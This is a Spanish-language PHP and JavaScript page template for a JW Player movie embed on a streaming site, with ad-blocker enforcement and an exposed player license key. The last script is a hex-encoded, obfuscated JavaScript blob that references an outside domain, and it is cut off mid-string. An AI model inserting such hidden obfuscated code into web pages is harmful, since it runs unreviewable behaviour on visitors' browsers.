<script>
        var randomHost = false;
        if (randomHost) $('#server-list').hide();
        
        showLoading();

        $('head').append('<style>.jw-sharing-link:active,.jw-sharing-copy:active.jw-sharing-link:hover,.jw-button-color.jw-toggle.jw-off:active:not(.jw-icon-cast),.jw-button-color.jw-toggle.jw-off:focus:not(.jw-icon-cast),.jw-button-color.jw-toggle.jw-off:hover:not(.jw-icon-cast),.jw-button-color.jw-toggle:not(.jw-icon-cast),.jw-button-color:active:not(.jw-icon-cast),.jw-button-color:focus:not(.jw-icon-cast),.jw-button-color:hover:not(.jw-icon-cast),.jw-button-color[aria-expanded=true]:not(.jw-icon-cast),.jw-settings-content-item.jw-settings-item-active,.jw-settings-menu .jw-icon.jw-button-color[aria-checked="true"] .jw-svg-icon{fill:#ff0023;color:#ff0023;background-color:transparent}.lds-ellipsis div{background:#ff0023}</style>');
        var player = jwplayer("videoContainer"), 
    sources_alt = [],
    timeElapse = "",
    retryKey = "",
    lastTime = xStorage.getItem(timeElapse),
    retry = xStorage.getItem(retryKey),
    hosts = ["zonaaps.com"],
    logStat,
    jwpConfig = {
        title: "<?php echo $nombrePeliculaDesencriptada; ?>",
        autostart: false,
        repeat: false,
        mute: false,
        rewind: false,
        image: "<?php echo $urlImagenDesencriptada; ?>",
        controls: true,
        hlshtml: true,
        primary: "html5",
        preload: "metadata",
        buffering: {
        bufferlength: 30 // Mantiene al menos 30 segundos de datos en el buffer
         },
        cast: {},
        androidhls: true,
        stretching: "uniform",
        displaytitle: true,
        displaydescription: false,
        playbackRateControls: true,
        captions: {
            color: "f1fff1",
            backgroundOpacity: 0
        },
        sources: [
            {
                file: '<?php echo $url_aaa; ?>',
                label: "720p HD",
                type: 'video/mp4',
                default: true // Esto hará que esta opción sea la predeterminada
            },
            {
                file: 'https://zonaaps.com/stream.php?video=<?php echo openssl($url_caa); ?>',
                label: "480p",
                type: 'video/mp4'
            },
            {
                file: 'https://zonaaps.com/stream.php?video=<?php echo openssl($url_baa); ?>',
                label: "360p",
                type: 'video/mp4'
            },
            {
                file: 'https://zonaaps.com/stream.php?video=<?php echo openssl($url_oaa); ?>',
                label: "240p",
                type: 'video/mp4'
            }
        ],
        tracks: [
            {
                file: '<?php echo $subsDesencriptados[0]; ?>',
                label: 'Español',
                kind: 'captions',
                default: false
            },
            {
                file: '<?php echo $subsDesencriptados[1]; ?>',
                label: 'English',
                kind: 'captions'
            }
        ],
        aspectratio: "16:9",
        floating: false,
        skin: loadSkin("netflix"),
        advertising: []
    },
    statCounted = false,
    adBlocker = true,
    enableShare = false,
    productionMode = false,
    visitAdsOnplay = false;

if (typeof jwplayer().key === 'undefined') {
    jwpConfig.key = 'ITWMv7t88JGzI0xPwW8I0+LveiXX9SWbfdmt0ArUSyc=';
}

if ("" !== "") {
    jwpConfig.logo = {
        "file": "",
        "link": "",
        "hide": false,
        "position": "top-right"
    };
}
var sandboxMode = sandblaster.detect(),
    sandboxAllowances = sandboxMode.sandboxAllowances,
    allowSandboxed = false;
if (sandblaster.resandbox()) {
    sandboxMode = sandblaster.detect();
    sandboxAllowances = sandboxMode.sandboxAllowances;
}
allowSandboxed = !sandboxMode.framed || sandboxMode.sandboxed === null || (sandboxMode.framed && (!sandboxMode.sandboxed || (sandboxMode.sandboxed && (sandboxAllowances.popups || sandboxAllowances.popupsToEscapeSandbox) && (sandboxAllowances.topNavigation || sandboxAllowances.topNavigationByUserActivation))));
if (allowSandboxed) {
    justDetectAdblock.detectAnyAdblocker().then(function(d) {
        if (adBlocker && (d || typeof canRunAds === 'undefined')) {
            destroyer();
        } else {
            if (jwpConfig.sources.length > 0) {
                loadPlayer(false);
            } else {
                $.ajax({
                    url: "",
                    type: "GET",
                    dataType: "json",
                    cache: false,
                    success: function(res) {
                        var isOK = false;
                        if (res.status === "ok") {
                            jwpConfig.title = res.title;
                            jwpConfig.image = res.poster;
                            jwpConfig.tracks = res.tracks;
        
                            if (res.sources.length > 0) {
                                isOK = true;
                                jwpConfig.sources = res.sources;
                                loadPlayer(false);
                            } else {
                                showMessage(res.message);
                            }
                        }
                        if (!isOK) {
                            if ($('#servers li').length > 0) {
                                var $next, $prev, $link, 
                                    $server = $('#servers li'),
                                    sChecked = xStorage.getItem('retry_multi~acf661d6e646670b305ce85dfa89bb97'),
                                    checked = sChecked !== null ? JSON.parse(sChecked) : [];
                                
                                if (checked.length < $server.length) {
                                    if (checked.length < $server.length) {
                                        $server.each(function(i, e) {
                                            if ($(this).find('a').hasClass('active')) {
                                                $next = $(this).next();
                                                $prev = $(this).prev();
                                                if ($next.length > 0) {
                                                    checked.push(i);
                                                    xStorage.setItem('retry_multi~acf661d6e646670b305ce85dfa89bb97', JSON.stringify(checked));
                                                    $link = $next.find('a').attr('href');
                                                } else if ($prev.length > 0) {
                                                    checked.push(i);
                                                    xStorage.setItem('retry_multi~acf661d6e646670b305ce85dfa89bb97', JSON.stringify(checked));
                                                    $link = $prev.find('a').attr('href');
                                                }
                                                return;
                                            }
                                        });
                                        window.location.href = $link;
                                    } else {
                                        showMessage(res.message);
                                        gtagReport("video_error", res.message, "jwplayer", false);
                                    }
                                } else {
                                    showMessage('Lo sentimos, este video no está disponible.');
                                    gtagReport("video_error", 'Fuentes no encontradas', "jwplayer", false);
                                }
                            } else {
                                if (res.status === 'ok' && res.sources.length === 0) {
                                    showMessage('Lo sentimos, este video no está disponible.');
                                    gtagReport("video_error", 'Fuentes no encontradas', "jwplayer", false);
                                } else {
                                    showMessage(res.message);
                                    gtagReport("video_error", res.message, "jwplayer", false);
                                }
                            }
                        }
                    },
                    error: function(xhr) {
                        var msg = '¡Error al obtener las fuentes de video del servidor!';
                        if ('responseJSON' in xhr && typeof xhr.responseJSON.message !== 'undefined') {
                            msg = xhr.responseJSON.message;
                        }
                        showMessage(msg);
                        gtagReport("video_error", msg, "jwplayer", false);
                    }
                });
            }
        }
    });
} else {
    showMessage('¡La incrustación Sandboxed no está permitida!');
}

if (hosts.indexOf('fembed') > -1) {
    logStat = setInterval(function() {
        $.ajax({
            url: "",
            method: "GET",
            dataType: "json",
            cache: false,
            success: function(res) {},
            error: function(xhr) {}
        });
    }, 3000);
}

$(document).ajaxSend(function (res, xhr, opt) {
    if (opt.url.indexOf('https://zonaaps.com/player/ajax/?action=stat') > -1) {
        if (statCounted) {
            xhr.abort();
        } else {
            statCounted = true;
        }
    }
});

function errorHandler(e) {
    showLoading();
    retry = xStorage.getItem(retryKey);
    if (e.code === 221000 && (retry === null || parseInt(retry) < 3)) {
        xStorage.setItem(retryKey, retry === null || retry === 'NaN' ? 1 : parseInt(retry) + 1);
        xStorage.setItem('autoplay', 'true');
        loadPlayer(true);
    } else {
        if (sources_alt.length > 0) {
            jwpConfig.sources = sources_alt;
            loadPlayer(true);
            return;
        } else {
            if (retry === null || parseInt(retry) < 3) {
                xStorage.setItem(retryKey, retry === null || retry === 'NaN' ? 1 : parseInt(retry) + 1);
                xStorage.setItem("autoplay", true);
                xStorage.removeItem("jwplayer.qualityLabel");
                $.ajax({
                    url: "",
                    method: "GET",
                    dataType: "json",
                    cache: false,
                    success: function(res) {
                        gtagReport("video_error", "Recargar página", "jwplayer", false);
                        location.reload();
                    },
                    error: function(xhr) {
                        gtagReport("video_error", "No se puede cargar la fuente", "jwplayer", false);
                        showMessage('No se puede cargar la fuente. <a href="javascript:void(0)" onclick="xStorage.clear();location.reload()">¡Recargar página!</a>');
                    }
                });
                return;
            } else if (e.code === 301161 && e.sourceError === null) {
                gtagReport("video_error", "Redirigir a HTTPS", "jwplayer", true);
                location.href = location.href.replace('http:', 'https:');
                return;
            } else {
                gtagReport("video_error", e.message, "jwplayer", false);
                showMessage(e.message + ' <a href="javascript:void(0)" onclick="xStorage.removeItem(retryKey);location.href=location.href">Recargar página</a>');
                return;
            }
        }
    }
}

function loadPlayer(resume) {
    // Inicialización del reproductor sin P2P
player.setup(jwpConfig);
addButton();
    player.on("setupError error", errorHandler);
    player.once("ready", function (e) {
        var autoplay = xStorage.getItem("autoplay");
        if ("netflix" === "netflix" || "netflix" === "hotstar") {
            $(".jw-slider-time").prepend($(".jw-text-elapsed")).append($(".jw-text-duration"));
        }
    $("#mContainer").hide();
    $("#videoContainer").show();
    if (autoplay === "true") {
        xStorage.removeItem("autoplay");
        player.play();
        if (resume) player.seek(xStorage.getItem(timeElapse));
    }
    gtagReport("video_ready_to_play", "Listo para reproducir", "jwplayer", false);
});
    player.once("beforePlay", function () {
        var $jrwn = $(".jw-icon-rewind"),
            $rwn = $("[button=\"rewind\"]"),
            $fwd = $("[button=\"forward\"]");
        if ($jrwn.length) {
            $jrwn.after($rwn);
            $rwn.after($fwd);
        }
        timeChecker();
        if (player.getCaptionsList().length > 1) player.setCurrentCaptions(1);
    });
    player.on("time", function (e) {
        lastTime = xStorage.getItem(timeElapse);
        if (e.position > 0 && e.position > lastTime) {
            xStorage.setItem(timeElapse, Math.round(e.position));
            xStorage.removeItem(retryKey);
        }
        if (e.position >= 60 && statCounted === false) {
            $.ajax({
                url: "",
                method: "GET",
                dataType: "json",
                cache: true,
                success: function(res) {},
                error: function(xhr) {}
            });
        }
    });
    player.once("complete playlistComplete", function (e) {
        gtagReport("video_complete", "La reproducción ha terminado", "jwplayer", false);
        xStorage.removeItem(timeElapse);
        if (logStat) clearInterval(logStat);
    });
    if (visitAdsOnplay) {
        player.once("play", function () {
            var wo = window.open("#", "_blank");
            setTimeout(function () {
                if (_hasPopupBlocker(wo) || typeof window.canRunAds === "undefined") {
                    $("#iframeAds").attr("src", "#");
                    $("#directAds").show();
                }
            }, 3000);
        });
    }
    window.player = player;
}

function destroyer() {
    if (player) {
        player.remove();
        player = null;
    }
    showMessage('<p><img src="https://zonaaps.com/player/assets/img/stop-sign-hand.webp" width="100" height="100"></p><p>Por favor, ayúdenos deshabilitando AdBlocker.</p>');
}


        function showMessage(msg) {
            if (msg !== null) $('#message').html(msg);
            $('#mContainer, #message').show();
            $('#loading, #videoContainer').hide();
        }

        function showLoading() {
            $('#message').text('Espere por favor...');
            $('#mContainer, #message, #loading').show();
            $('#videoContainer').hide();
        }

        function showPlayer() {
            $('#mContainer').hide();
            $('#videoContainer').show();
        }

        function addButton() {
            var rewindIcon = '', forwardIcon = '', 
                smallLogoFile = 'https://zonaaps.com/anime.png',
                smallLogoURL = 'https://zonaaps.com/',
                showDownloadButton = false,
                enableDownloadPage = false;
            if ("netflix" === "hotstar") {
                rewindIcon = '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-rewind" viewBox="0 0 24 24" focusable="false"><path d="M12.436 18.191c.557.595.665 1.564.167 2.215-.522.687-1.469.794-2.114.238a1.52 1.52 0 01-.12-.115l-6.928-7.393a1.683 1.683 0 010-2.271l6.929-7.393a1.437 1.437 0 012.21.093c.521.65.419 1.645-.148 2.25l-5.448 5.814a.55.55 0 000 .743l5.453 5.82h-.001zm4.648-6.563a.553.553 0 000 .744l3.475 3.709a1.683 1.683 0 01-.115 2.382c-.61.532-1.519.418-2.075-.175l-4.828-5.152a1.683 1.683 0 010-2.27l4.888-5.218c.56-.599 1.46-.632 2.056-.074.664.621.632 1.751.007 2.418l-3.409 3.636z" fill-rule="evenodd" clip-rule="evenodd"/></svg>';
                forwardIcon = '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-forward" viewBox="0 0 24 24" focusable="false"><path d="M11.564 18.19l5.453-5.818a.55.55 0 000-.743l-5.448-5.815c-.567-.604-.67-1.598-.148-2.249.536-.673 1.483-.757 2.115-.186.033.03.065.06.095.093l6.928 7.392a1.683 1.683 0 010 2.272L13.63 20.53a1.439 1.439 0 01-2.125.005 1.588 1.588 0 01-.109-.128c-.498-.65-.39-1.62.166-2.215h.001zm-4.647-6.562L3.508 7.992c-.624-.667-.657-1.797.007-2.418a1.436 1.436 0 012.056.074l4.888 5.217a1.683 1.683 0 010 2.271l-4.827 5.151c-.558.594-1.466.708-2.075.177-.647-.56-.745-1.574-.218-2.262.032-.043.066-.083.103-.122l3.475-3.708a.553.553 0 000-.744z" fill-rule="evenodd" clip-rule="evenodd"/></svg>';
            } else if ("netflix" === "netflix") {
                rewindIcon = '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-rewind" viewBox="0 0 24 24" focusable="false"><g id="back-10"><path d="M12.4521632,5.01256342 L13.8137335,6.91876181 L12.1862665,8.08123819 L9.27109639,4 L12.1862665,-0.0812381937 L13.8137335,1.08123819 L12.4365066,3.0093558 C17.7568368,3.23786247 22,7.6234093 22,13 C22,18.5228475 17.5228475,23 12,23 C6.4771525,23 2,18.5228475 2,13 C2,11.0297737 2.57187523,9.14190637 3.62872363,7.52804389 L5.30188812,8.6237266 C4.4566948,9.91438076 4,11.4220159 4,13 C4,17.418278 7.581722,21 12,21 C16.418278,21 20,17.418278 20,13 C20,8.73346691 16.6600802,5.24701388 12.4521632,5.01256342 Z M8.47,17 L8.47,11.41 L6.81,11.92 L6.81,10.75 L9.79,9.91 L9.79,17 L8.47,17 Z M14.31,17.15 C13.7499972,17.15 13.2600021,17.0016682 12.84,16.705 C12.4199979,16.4083319 12.0950011,15.9883361 11.865,15.445 C11.6349988,14.901664 11.52,14.2600037 11.52,13.52 C11.52,12.786663 11.6349988,12.1466694 11.865,11.6 C12.0950011,11.0533306 12.4199979,10.6316682 12.84,10.335 C13.2600021,10.0383319 13.7499972,9.89 14.31,9.89 C14.8700028,9.89 15.3599979,10.0383319 15.78,10.335 C16.2000021,10.6316682 16.5249988,11.0533306 16.755,11.6 C16.9850012,12.1466694 17.1,12.786663 17.1,13.52 C17.1,14.2600037 16.9850012,14.901664 16.755,15.445 C16.5249988,15.9883361 16.2000021,16.4083319 15.78,16.705 C15.3599979,17.0016682 14.8700028,17.15 14.31,17.15 Z M14.31,15.97 C14.7500022,15.97 15.1016653,15.7533355 15.365,15.32 C15.6283346,14.8866645 15.76,14.2866705 15.76,13.52 C15.76,12.7533295 15.6283346,12.1533355 15.365,11.72 C15.1016653,11.2866645 14.7500022,11.07 14.31,11.07 C13.8699978,11.07 13.5183346,11.2866645 13.255,11.72 C12.9916653,12.1533355 12.86,12.7533295 12.86,13.52 C12.86,14.2866705 12.9916653,14.8866645 13.255,15.32 C13.5183346,15.7533355 13.8699978,15.97 14.31,15.97 Z M7.72890361,4 L9.81373347,6.91876181 L8.18626653,8.08123819 L5.27109639,4 L8.18626653,-0.0812381937 L9.81373347,1.08123819 L7.72890361,4 Z"></path></g></svg>';
                forwardIcon = '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-forward" viewBox="0 0 24 24" focusable="false"><g id="forward-10"><path d="M11.8291288,3.00143042 L10.4575629,1.08123819 L12.0850299,-0.0812381937 L15.0002,4 L12.0850299,8.08123819 L10.4575629,6.91876181 L11.8267943,5.0018379 C7.48849327,5.09398699 4,8.63960287 4,13 C4,17.418278 7.581722,21 12,21 C16.418278,21 20,17.418278 20,13 C20,11.4220159 19.5433052,9.91438076 18.6981119,8.6237266 L20.3712764,7.52804389 C21.4281248,9.14190637 22,11.0297737 22,13 C22,18.5228475 17.5228475,23 12,23 C6.4771525,23 2,18.5228475 2,13 C2,7.53422249 6.38510184,3.09264039 11.8291288,3.00143042 Z M8.56,17 L8.56,11.41 L6.9,11.92 L6.9,10.75 L9.88,9.91 L9.88,17 L8.56,17 Z M14.4,17.15 C13.8399972,17.15 13.3500021,17.0016682 12.93,16.705 C12.5099979,16.4083318 12.1850012,15.988336 11.955,15.445 C11.7249989,14.9016639 11.61,14.2600037 11.61,13.52 C11.61,12.786663 11.7249989,12.1466694 11.955,11.6 C12.1850012,11.0533306 12.5099979,10.6316681 12.93,10.335 C13.3500021,10.0383318 13.8399972,9.89 14.4,9.89 C14.9600028,9.89 15.4499979,10.0383318 15.87,10.335 C16.2900021,10.6316681 16.6149988,11.0533306 16.845,11.6 C17.0750012,12.1466694 17.19,12.786663 17.19,13.52 C17.19,14.2600037 17.0750012,14.9016639 16.845,15.445 C16.6149988,15.988336 16.2900021,16.4083318 15.87,16.705 C15.4499979,17.0016682 14.9600028,17.15 14.4,17.15 Z M14.4,15.97 C14.8400022,15.97 15.1916654,15.7533355 15.455,15.32 C15.7183347,14.8866645 15.85,14.2866705 15.85,13.52 C15.85,12.7533295 15.7183347,12.1533355 15.455,11.72 C15.1916654,11.2866645 14.8400022,11.07 14.4,11.07 C13.9599978,11.07 13.6083346,11.2866645 13.345,11.72 C13.0816654,12.1533355 12.95,12.7533295 12.95,13.52 C12.95,14.2866705 13.0816654,14.8866645 13.345,15.32 C13.6083346,15.7533355 13.9599978,15.97 14.4,15.97 Z M14.4575629,6.91876181 L16.5423928,4 L14.4575629,1.08123819 L16.0850299,-0.0812381937 L19.0002,4 L16.0850299,8.08123819 L14.4575629,6.91876181 Z"></path></g></svg>';
            } else {
                rewindIcon = '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-rewind" viewBox="0 0 1024 1024" focusable="false"><path d="M455.68 262.712889l-67.072 79.644444-206.904889-174.08 56.775111-38.627555a468.48 468.48 0 1 1-201.216 328.817778l103.310222 13.141333a364.487111 364.487111 0 0 0 713.614223 139.605333 364.373333 364.373333 0 0 0-479.971556-435.541333l-14.904889 5.973333 96.312889 81.066667zM329.955556 379.505778h61.610666v308.167111H329.955556zM564.167111 364.088889c61.269333 0 110.933333 45.511111 110.933333 101.717333v135.566222c0 56.149333-49.664 101.660444-110.933333 101.660445s-110.933333-45.511111-110.933333-101.660445V465.749333c0-56.149333 49.664-101.660444 110.933333-101.660444z m0 56.490667c-27.249778 0-49.322667 20.252444-49.322667 45.226666v135.566222c0 24.974222 22.072889 45.169778 49.322667 45.169778 27.192889 0 49.265778-20.195556 49.265778-45.169778V465.749333c0-24.917333-22.072889-45.169778-49.265778-45.169777z" p-id="7377"></path></svg>';
                forwardIcon = '<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-forward" viewBox="0 0 1024 1024" focusable="false"><path d="M561.948444 262.712889l67.015112 79.644444 206.961777-174.08-56.832-38.627555a468.48 468.48 0 1 0 201.216 328.817778l-103.310222 13.141333a364.487111 364.487111 0 0 1-713.557333 139.605333 364.373333 364.373333 0 0 1 479.971555-435.541333l14.904889 5.973333-96.369778 81.066667zM329.955556 379.505778h61.610666v308.167111H329.955556zM564.167111 364.088889c61.269333 0 110.933333 45.511111 110.933333 101.717333v135.566222c0 56.149333-49.664 101.660444-110.933333 101.660445s-110.933333-45.511111-110.933333-101.660445V465.749333c0-56.149333 49.664-101.660444 110.933333-101.660444z m0 56.490667c-27.249778 0-49.322667 20.252444-49.322667 45.226666v135.566222c0 24.974222 22.072889 45.169778 49.322667 45.169778 27.192889 0 49.265778-20.195556 49.265778-45.169778V465.749333c0-24.917333-22.072889-45.169778-49.265778-45.169777z" p-id="7407"></path></svg>';
            }
            window.player.addButton(rewindIcon, "Rebobinar 10 segundos", function () {
                var seek = 0,
                    time = window.player.getPosition() - 10;
                seek = time <= 0 ? 0 : time;
                window.player.seek(seek);
                return true
            }, "rewind");
            window.player.addButton(forwardIcon, "Adelante 10 segundos", function () {
                var seek = 0,
                    time = window.player.getPosition() + 10;
                seek = time <= 0 ? 0 : time;
                window.player.seek(seek);
                return true
            }, "forward");
            if (showDownloadButton && enableDownloadPage) {
                window.player.addButton('<svg xmlns="http://www.w3.org/2000/svg" class="jw-svg-icon jw-svg-icon-download" viewBox="0 0 512 512"><path d="M412.907 214.08C398.4 140.693 333.653 85.333 256 85.333c-61.653 0-115.093 34.987-141.867 86.08C50.027 178.347 0 232.64 0 298.667c0 70.72 57.28 128 128 128h277.333C464.213 426.667 512 378.88 512 320c0-56.32-43.84-101.973-99.093-105.92zM256 384L149.333 277.333h64V192h85.333v85.333h64L256 384z"/></svg>', "Descargar Amor y Otras Drogas mas", function() {
                    window.open("Link de descarga aqui", "_blank");
                    return true;
                }, "download");
            }
            if (smallLogoFile !== '') {
                window.player.addButton(smallLogoFile, '', function() {
                    if (smallLogoURL !== '') window.open(smallLogoURL, "_blank");
                    return true;
                }, "small_logo");
            }
        }

        function loadSkin(name){
            if(name !== '' && name !== 'default'){
                var skin = {
                    url: 'https://zonaaps.com/player/assets/css/skin/jwplayer/netflix.css',
                    name: 'netflix',
                    controlbar:{},
                    timeslider:{},
                    menus:{}
                };
                if(name === 'netflix'){
                    skin.controlbar = {
                        icons: '#ffffff',
                        iconsActive: '#e50914'
                    };
                    skin.timeslider = {
                        progress: '#e50914',
                        rail: '#5b5b5b'
                    };
                    skin.menus = {
                        background: "#262626",
                        textActive: "#e50914",
                    };
                } else if(name === 'hotstar'){
                    skin.controlbar = {
                        icons: '#ffffff',
                        iconsActive: '#1f80e0'
                    };
                    skin.timeslider = {
                        progress: '#1f80e0',
                        rail: 'rgba(255,255,255,.2)'
                    };
                    skin.menus = {
                        background: "rgba(18,18,18,.95)",
                        textActive: "#1f80e0",
                    };
                }
                return skin;
            } else {
                return {
                    controlbar: {
                        iconsActive: "#ff0023",
                    },
                    timeslider: {
                        progress: "#ff0023",
                    },
                    menus: {
                        background: "#121212",
                        textActive: "#ff0023",
                    }
                };
            }
        }

        function _hasPopupBlocker(wo) {
            if(wo === null) return true;
            else if(typeof wo === 'undefined') return true;
            return false;
        }
        

        function gtagReport(event, label, category, interaction) {
            if (typeof gtag !== "undefined") {
                gtag("event", event, {
                    "event_label": label,
                    "event_category": category,
                    "non_interaction": interaction
                });
            }
        }
        
        window.onorientationchange = function(e) {
            if (e.landscape) {
                var vid = document.getElementsByTagName("video")[0];
                if (vid.requestFullscreen) {
                    vid.requestFullscreen()
                } else if (vid.mozRequestFullScreen) {
                    vid.mozRequestFullScreen()
                } else if (vid.webkitRequestFullscreen) {
                    vid.webkitRequestFullscreen()
                }
            }
        };

        if ('mediaSession' in navigator && typeof window.player !== "undefined") {
            navigator.mediaSession.metadata = new MediaMetadata({
                title: "Movie Days",
                artwork: [
                    {
                        src: '<?php echo $urlImagenDesencriptada; ?>', 
                        sizes: '96x96', 
                        type: 'image/jpg' 
                    },
                    {
                        src: '<?php echo $urlImagenDesencriptada; ?>', 
                        sizes: '128x128',
                        type: 'image/jpg' 
                    },
                    {
                        src: '<?php echo $urlImagenDesencriptada; ?>', 
                        sizes: '192x192',
                        type: 'image/jpg' 
                    },
                    {
                        src: '<?php echo $urlImagenDesencriptada; ?>', 
                        sizes: '256x256',
                        type: 'image/jpg' 
                    },
                    {
                        src: '<?php echo $urlImagenDesencriptada; ?>', 
                        sizes: '384x384',
                        type: 'image/jpg' 
                    },
                    {
                        src: '<?php echo $urlImagenDesencriptada; ?>', 
                        sizes: '512x512',
                        type: 'image/jpg' 
                    }
                ]
            });
            if (window.player) {
                navigator.mediaSession.setActionHandler('play', function() {
                    window.player.play();
                });
                navigator.mediaSession.setActionHandler('pause', function() {
                    window.player.pause();
                });
                navigator.mediaSession.setActionHandler('stop', function() {
                    window.player.stop();
                });
                navigator.mediaSession.setActionHandler('seekbackward', function() {
                    var seek = 0,
                        time = window.player.getPosition() - 10;
                    seek = time <= 0 ? 0 : time;
                    window.player.seek(seek);
                });
                navigator.mediaSession.setActionHandler('seekforward', function() {
                    var seek = 0,
                        time = window.player.getPosition() + 10;
                    seek = time <= 0 ? 0 : time;
                    window.player.seek(seek);
                });
            }
        }
    </script>
    
<script>
document.addEventListener('DOMContentLoaded', (event) => {
    const video = document.querySelector('video');
    let intentionalPause = false;
    let wasPlayingBeforeDisconnection = false;

    function checkConnection() {
        if (!navigator.onLine) {
            alert("Conexión perdida. El video se pausará para intentar reconectar!.");
            if (!video.paused) {
                wasPlayingBeforeDisconnection = true;
                video.pause();
                intentionalPause = false;
            } else {
                wasPlayingBeforeDisconnection = false;
            }
        } else {
            if (wasPlayingBeforeDisconnection && !intentionalPause) {
                video.play();
            }
        }
    }

    // Detectar pausa intencional
    video.addEventListener('pause', () => {
        if (navigator.onLine) {
            intentionalPause = true;
        }
    });

    video.addEventListener('play', () => {
        intentionalPause = false;
    });

    // Monitorea cambios en la conexión
    window.addEventListener('offline', checkConnection);
    window.addEventListener('online', checkConnection);

    // Control del buffer
    video.addEventListener('progress', function() {
        if (video.readyState === 4) { // Comprobar si el video está completamente cargado
            var buffered = video.buffered;
            var currentTime = video.currentTime;

            if (buffered.length > 0) {
                var bufferEnd = buffered.end(buffered.length - 1);
                
                // Verifica si hay al menos 3 segundos de buffer disponible antes de continuar
                if (bufferEnd - currentTime >= 3) {
                    if (!intentionalPause && video.paused) {
                        video.play();
                        console.log('Buffer suficiente, reanudando reproducción.');
                    }
                }
            }
        }
    });

    // Intentos automáticos de recargar el video si la conexión se ha restablecido
    setInterval(() => {
        if (navigator.onLine && wasPlayingBeforeDisconnection && !intentionalPause && video.paused) {
            video.play();
        }
    }, 3000);
});
</script>

<script type='text/javascript'>
<!-- 
var t="203c73637269707420747970653d27746578742f6a617661736372697074273e0d0a202020766172205f3078353638383d5b225c7837335c7836385c7836395c7836365c783734222c225c7837305c7837355c7837335c783638222c225c7837335c7836355c7837345c7835345c7836395c7836445c7836355c7836465c7837355c783734222c225c7836325c7836465c7836345c783739222c225c7836335c7836435c7836315c7837335c7837335c7834455c7836315c7836445c783635222c22222c225c7833345c7833375c7833325c7833345c7833395c7833325c7837375c7836355c7834345c7834445c7836375c783431222c225c7833325c7833305c7833385c7833375c7833365c7833375c7833345c7835315c7835355c7836385c7834455c7836345c783644222c225c7833325c7833335c7833325c7833385c7833395c7833375c7833385c7834345c7835385c7836435c7837355c7836335c783441222c225c7833325c7833315c7833385c7833325c7833385c7833355c7833365c7837335c7835325c7834375c7834395c7835355c783445222c225c7833315c7833335c7833325c7833325c7833375c7833315c7833385c7834365c7836345c7836465c7837305c7834345c783639222c225c7833375c7834425c7835345c7837335c7835305c7835395c783445222c225c7833365c7833365c7834435c7836315c7836455c7837415c7836385c783738222c225c7833375c7833325c7833375c7833375c7833385c7833355c7834415c7836445c7834395c7837395c7835355c783442222c225c7833315c7833315c7833325c7833365c7833365c7833375c7833375c7836415c7836415c7834375c7836385c7836465c783443222c225c7837325c7836355c7837305c7836435c7836315c7836335c783635222c225c7833335c7836395c7834375c7835415c7836385c7835335c783739222c225c7833375c7833395c7833305c7833365c7833395c7833305c7835315c7837335c7836395c7836395c7835335c783432222c225c7833395c7833355c7833345c7833395c7833395c7833325c7837375c7837415c7834445c7834375c7835335c783631222c225c7833355c7837315c7836325c7836395c7834355c7836415c783437222c225c7833325c7833365c7833325c7833345c7833375c7833395c7836375c7836365c7836435c7835345c7834385c783436222c225c7833355c7833325c7833365c7833395c7833335c7833335c7837415c7834315c7834385c7836395c7837385c783632222c225c7833325c7833375c7837395c7835335c7836415c7837415c7836445c783739222c225c7833355c7836465c7835375c7835335c7836445c7836385c783441222c225c7833355c7833385c7833365c7833395c7833365c7833355c7833365c7836335c7837335c7837325c7837385c7835305c783633222c225c7833315c7833305c7833365c7833385c7833395c7833335c7833325c7833305c7836415c7836325c7837375c7835315c7837345c783733222c225c7833315c7833375c7833395c7833395c7833305c7833305c7833305c7837415c7837335c7834375c7836455c7836455c783442222c225c7836385c7837345c7837345c7837305c7837335c7833415c7832465c7832465c7836335c7836315c7836325c7836435c7836355c7836375c7837325c7836315c7837345c7836395c7837335c7836385c7836345c7832455c7836465c7836455c7836435c7836395c7836455c783635225d3b2866756e6374696f6e285f30783731303678312c5f3078373130367832297b766172205f30783731303678333d5f3078316133662c5f30783731303678343d5f307837313036783128293b7768696c652821215b5d297b7472797b766172205f30783731303678353d2d7061727365496e74285f307837313036783328307831373729292f20307831202b207061727365496e74285f307837313036783328307831366529292f203078322a20282d7061727365496e74285f307837313036783328307831373929292f2030783329202b202d7061727365496e74285f307837313036783328307831366229292f20307834202b207061727365496e74285f307837313036783328307831363329292f203078352a20287061727365496e74285f307837313036783328307831366629292f2030783629202b202d7061727365496e74285f307837313036783328307831373329292f20307837202a20282d7061727365496e74285f307837313036783328307831373029292f2030783829202b202d7061727365496e74285f307837313036783328307831363729292f20307839202a20287061727365496e74285f307837313036783328307831376129292f2030786129202b202d7061727365496e74285f307837313036783328307831373429292f20307862202a20282d7061727365496e74285f307837313036783328307831363929292f20307863293b6966285f30783731303678353d3d3d205f3078373130367832297b627265616b7d656c7365207b5f30783731303678345b5f3078353638385b315d5d285f30783731303678345b5f3078353638385b305d5d2829297d7d6361746368285f3078326133323438297b5f30783731303678345b5f3078353638385b315d5d285f30783731303678345b5f3078353638385b305d5d2829297d7d7d285f3078343639392c3078623434343929293b766172205f30783430393138353d5f3078323164393b66756e6374696f6e205f307831613366285f30783731303678382c5f3078373130367839297b766172205f30783731303678613d5f30783436393928293b72657475726e205f3078316133663d2066756e6374696f6e285f30783731303678622c5f3078373130367863297b5f30783731303678623d205f30783731303678622d2030783136333b766172205f30783731303678643d5f30783731303678615b5f30783731303678625d3b72657475726e205f30783731303678647d2c5f307831613366285f30783731303678382c5f3078373130367839297d66756e6374696f6e205f30783431646128297b766172205f30783731303678663d5f3078316133662c5f3078373130367831303d5b5f3078373130367866283078313732292c5f3078373130367866283078313736292c5f3078373130367866283078313664292c5f3078353638385b325d2c5f3078373130367866283078313635292c5f3078373130367866283078313661292c5f3078373130367866283078313636292c5f3078353638385b335d2c5f3078373130367866283078313663292c5f3078373130367866283078313762292c5f3078373130367866283078313638295d3b72657475726e205f3078343164613d2066756e6374696f6e28297b72657475726e205f3078373130367831307d2c5f30783431646128297d66756e6374696f6e205f307832316439285f3078373130367831322c5f307837313036783133297b766172205f3078373130367831343d5f30783431646128293b72657475726e205f3078323164393d2066756e6374696f6e285f3078373130367831352c5f307837313036783136297b5f3078373130367831353d205f3078373130367831352d2030783135393b